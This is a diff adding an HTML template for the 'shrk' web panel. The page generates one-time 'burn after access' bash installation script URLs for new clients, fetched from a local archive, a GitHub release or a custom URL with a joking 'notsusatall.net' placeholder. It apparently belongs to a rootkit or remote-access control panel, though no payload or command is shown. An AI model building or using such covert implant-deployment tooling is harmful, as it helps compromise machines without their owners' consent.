@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    {% include "parts/header.html" %}
+    <title>shrk / new</title>
+    <link href="{{path}}/static/new.css" rel="stylesheet">
+  </head>
+  <body>
+    {% include "parts/navbar.html" %}
+    <main>
+      {% if script %}
+        <h1>created a new client: {{client.ID}}</h1>
+        <h3>you will not be able to access this URL again so copy it now or never</h3>
+
+        <form action="#">
+          <div class="labelbox">
+            <label>installation script URL</label>
+            <input id="script" type="text" name="custom" value="{{script}}" readonly>
+          </div>
+
+          <button id="copy" type="submit">copy the URL</button>
+        </form>
+      {% else %}
+        <h1>create a new client</h1>
+        <h3>add a new client with an automatic installation bash script</h3>
+
+        {% if error %}
+          <h3 class="error">generation failed: {{error}}</h3>
+        {% endif %}
+
+        <form action="new" method="POST">
+          <div class="labelbox">
+            <label>select a method to obtain the client source</label>
+            <select name="source" id="source">
+              <option value="local">local archive</option>
+              <option value="github">github release</option>
+              <option value="custom">custom URL</option>
+            </select>
+          </div>
+
+          <div class="labelbox" id="custom">
+            <label>custom HTTP/HTTPS URL (needs to be decompressable with tar)</label>
+            <input type="text" name="custom" placeholder="https://notsusatall.net/shrk">
+          </div>
+         
+          <div class="checkbox">
+            <label>burn after access</label>
+            <input type="checkbox" name="burn" checked />
+          </div>
+          
+          <button type="submit">generate script</button>
+        </form>
+      {% endif %}
+    </main>
+    <script src="{{path}}/static/new.js"></script>
+  </body>
+</html>
